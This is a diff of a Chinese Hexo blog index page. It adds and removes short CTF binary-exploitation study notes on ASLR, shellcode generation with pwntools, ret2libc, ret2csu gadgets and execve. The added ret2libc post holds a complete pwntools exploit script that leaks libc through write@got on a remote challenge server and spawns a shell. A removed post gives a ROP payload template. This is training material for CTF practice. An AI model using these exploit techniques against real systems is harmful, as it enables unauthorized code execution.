@@ -145,6 +145,251 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/22/echo%E5%87%BD%E6%95%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/09/22/echo%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-09-22 21:08:16 / 修改时间：21:09:03" itemprop="dateCreated datePublished" datetime="2024-09-22T21:08:16+08:00">2024-09-22</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>echo</p>
+<p>echo 有多种解法，可以通过管道符号重定向把flag的内容读出来，可以利⽤bash报错信息把flag读出来 &#x2F;flag</p>
+<p> echo <code>&lt;/flag</code></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/19/%E7%94%9F%E6%88%90Shellcode%E4%BB%A5%E5%8F%8AASLR%E4%BD%9C%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/09/19/%E7%94%9F%E6%88%90Shellcode%E4%BB%A5%E5%8F%8AASLR%E4%BD%9C%E7%94%A8/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-09-19 20:14:30 / 修改时间：20:14:31" itemprop="dateCreated datePublished" datetime="2024-09-19T20:14:30+08:00">2024-09-19</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>ASLR主要影响stack、share library、heap几个部分。<br>当ASLR&#x3D;0时，栈和堆的地址都不会改变。<br>当ASLR&#x3D;1时，栈的地址变了，堆的地址不变。<br>当ASLR&#x3D;2时，栈和堆的地址都变了。</p>
+<p>生成shellcode<br>32位：<br>print(shellcraft.sh()) 生成的是shell的汇编代码<br>print(asm(shellcraft.sh())) 生成的是shell的机械码</p>
+<p>64位：<br>context.arch&#x3D;“amd64”<br>print(shellcraft.sh()) 生成的是shell的汇编代码<br>print(asm(shellcraft.sh())) 生成的是shell的机械码</p>
+<p>gcc -fno-stack-protector -z execstack -no-pie -g -o ret2 ret2.c</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/12/ret2libc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/09/12/ret2libc/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-09-12 21:44:39 / 修改时间：21:45:06" itemprop="dateCreated datePublished" datetime="2024-09-12T21:44:39+08:00">2024-09-12</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29610</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;../libc-2.23_32.so&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload=p8(<span class="number">0</span>)*(offset+<span class="number">4</span>)+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(main_addr)+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_base=u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">payload=<span class="string">b&#x27;p&#x27;</span>*(offset+<span class="number">4</span>)+p32(system_addr)+<span class="string">b&#x27;dead&#x27;</span>+p32(bin_sh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/09/system/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/09/09/system/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-09-09 20:07:45 / 修改时间：20:09:31" itemprop="dateCreated datePublished" datetime="2024-09-09T20:07:45+08:00">2024-09-09</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><code>system@plt</code>地址，因为plt地址需要返回值，所以需要的位数更多。</p>
+<p>sh可以作为字符串bin&#x2F;sh的替代品。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/06/Canary%E7%9B%B8%E5%85%B3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -590,272 +835,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/10/c%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86%E7%82%B9/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/06/10/c%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86%E7%82%B9/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-06-10 21:35:52" itemprop="dateCreated datePublished" datetime="2024-06-10T21:35:52+08:00">2024-06-10</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)src = <span class="number">48</span>;</span><br></pre></td></tr></table></figure>
-
-<p>指代src的长度为48字节。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/03/LitCTF%20PWN%E9%83%A8%E5%88%86%20ATM%E9%A2%98%E8%A7%A3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/06/03/LitCTF%20PWN%E9%83%A8%E5%88%86%20ATM%E9%A2%98%E8%A7%A3/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-06-03 21:10:14" itemprop="dateCreated datePublished" datetime="2024-06-03T21:10:14+08:00">2024-06-03</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="LitCTF-PWN部分-ATM题解"><a href="#LitCTF-PWN部分-ATM题解" class="headerlink" title="**   LitCTF PWN部分 ATM题解**"></a>**   LitCTF PWN部分 ATM题解**</h1><p>打开vm进行文件类型查看。</p>
-<p><img src="https://ooo.0x0.ooo/2024/06/03/OJGnDj.png"></p>
-<p>打开ida看反汇编代码。</p>
-<p><img src="https://ooo.0x0.ooo/2024/06/03/OJGNxU.png"></p>
-<p><img src="https://ooo.0x0.ooo/2024/06/03/OJG18p.png"></p>
-<p><strong>HIWORD是High Word的缩写,作用是取得某个4字节变量(即32位的值)在内存中处于高位的两个字节,即一个word长的数据</strong><br><strong>LOWORD是Low Word的缩写,作用是取得某个4字节变量(即32位的值)在内存中处于低位的两个字节,即一个word长的数据</strong></p>
-<p>无后门，推测使用ret2libc。选项5可以泄露printf的地址，可以直接利用。</p>
-<p>本地运行程序后，进入选项3输入后进入选项1发现balance值为乱序。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原因：</span><br><span class="line"></span><br><span class="line">v5 = (unsigned int)nptr;</span><br><span class="line">此操作将nptr数组的地址转换为无符号整数类型并存储在v5变量中。而正确应该是将用户输入的字符串转换为数字类型才合理。</span><br></pre></td></tr></table></figure>
-
-<p>进入3选项加钱，钱相当于下面选项5的输入长度，使可输入值尽可能大来进行栈溢出。</p>
-<p>offse&#x3D;0x160+0x08 </p>
-<p>利用ropgadget寻找对应的pop rdi，ret的地址</p>
-<p>之后进行64的ROP模板</p>
-<p>payload&#x3D;offset*b‘a’+p64（pop rdi）+p64（binsh）+p64（ret）+p64（system）</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/20/ret2csu%E4%B8%87%E8%83%BDgadget/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/05/20/ret2csu%E4%B8%87%E8%83%BDgadget/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-05-20 21:41:45" itemprop="dateCreated datePublished" datetime="2024-05-20T21:41:45+08:00">2024-05-20</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="ret2csu万能gadget"><a href="#ret2csu万能gadget" class="headerlink" title="ret2csu万能gadget"></a>ret2csu万能gadget</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#万能gadget1：</span></span><br><span class="line">pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span><br><span class="line">  </span><br><span class="line"><span class="comment">#万能gadget2：</span></span><br><span class="line">mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*<span class="number">8</span>]; add  rbx, <span class="number">1</span>; cmp  rbx, rbp; jnz   short loc_400620</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><strong>分析可得：</strong>处理后栈结构中布置的数据将要依次存入以下寄存器中—— rbx, rbq, r12, rdx, rsi, edi</p>
-<p> 在这些寄存器中，主要关注的是  r12，                   rdx，            rsi，             edi寄存器，</p>
-<p> 他们分别保存着将要调用函数的指针的地址、第三个参数、第二个参数和第一个参数。</p>
-<p>而rbx和rbp必须的需要将它们的值置为0和1。</p>
-<p><strong>原因：</strong>在gadget2中，我们call了 [r12+rbx<em>8] ，将rbx置为0即 [r12+rbx</em>8] &#x3D;&#x3D; [r12]，方便我们传参。而设置rbp为1是因为 <em>add rbx, 1; cmp rbx, rbp; jnz xxxxxx</em> 。由于我们通常使rbx&#x3D;0，从而使r12+rbx*8 &#x3D; r12，所以call指令结束后rbx必然会变成1。若此时rbp !&#x3D; 1，jnz会再次进行call，从而可能引起段错误。</p>
-<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/20/execve%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%89%E4%B8%AA%E5%8F%98%E9%87%8F%E6%84%8F%E4%B9%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/05/20/execve%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%89%E4%B8%AA%E5%8F%98%E9%87%8F%E6%84%8F%E4%B9%89/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-05-20 20:21:56" itemprop="dateCreated datePublished" datetime="2024-05-20T20:21:56+08:00">2024-05-20</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h2><p>execve这个函数有三个参数</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file,<span class="type">char</span> *<span class="type">const</span> argv[],<span class="type">char</span> *<span class="type">const</span> envp[])</span></span></span><br></pre></td></tr></table></figure>
-
-<p><strong>第一个参数，是要打开运行的二进制文件，这个是个文件路径，绝对路径和相对路径都可以</strong></p>
-<p>1、文件路径为&#x2F;bin&#x2F;sh，这个sh其实是个shell程序，如果argv是空（0也可以），那么就会去打开一个shell，所以execve(“&#x2F;bin&#x2F;sh”,0,0)是我们最常用的，but如果argv不为空呢，sh就可以变成变成一个shell脚本解析器，这时候argv应该是这么组成char *argv[]&#x3D;{“&#x2F;bin&#x2F;sh”,”flag”,NULL}<br>2、文件路径为&#x2F;bin&#x2F;cat，这个cat故名思议就是打印文件内容的程序，函数形式为execve(“&#x2F;bin&#x2F;cat”,argv,0),argv[]&#x3D;{“&#x2F;bin&#x2F;cat”,”flag”,NULL}这样子这个数组的第一个内容是文件路径，这个和execve的第一个参数一样，但是吧由于argv的特性，所以数组的第一个一定得是这个，然后第二个就是我们要解析的脚本路径，我这边是相对路径，然后第三个是空，这个是argv的要求，要求最后一个一定得是NULL，这个有什么用呢，如果argv里面的要解析的文件不是shell程序，那么就会把文件内容以报错的形式输出出来，如果题目把0(标准输入)和1(标准输出)关了，还能这么拿到flag</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span><br></pre></td></tr></table></figure>
-
-<p>在说明第二个参数之前，我们要说明一下这个execve的功能，我们知道程序的执行是由进程执行的，那么如果使用的execve，这个函数后面的代码全部不执行，转头去执行我们第一个参数指向的二进制代码<br>主函数是有参数的，可以通过这个参数传一些信息给主函数</p>
-<p><strong>第二个参数，我们上面提到了主函数有两个参数，第二个参数叫做argv，这个刚好和我们第二个参数名字一样，其实我们第二个参数就是原封不动的传给要去执行的二进制代码的argv参数，这个参数的详细介绍后面再说</strong><br><strong>第三个参数是环境变量，这个我并没有细究，因为通常都是NULL</strong></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -921,7 +904,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-count">33</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
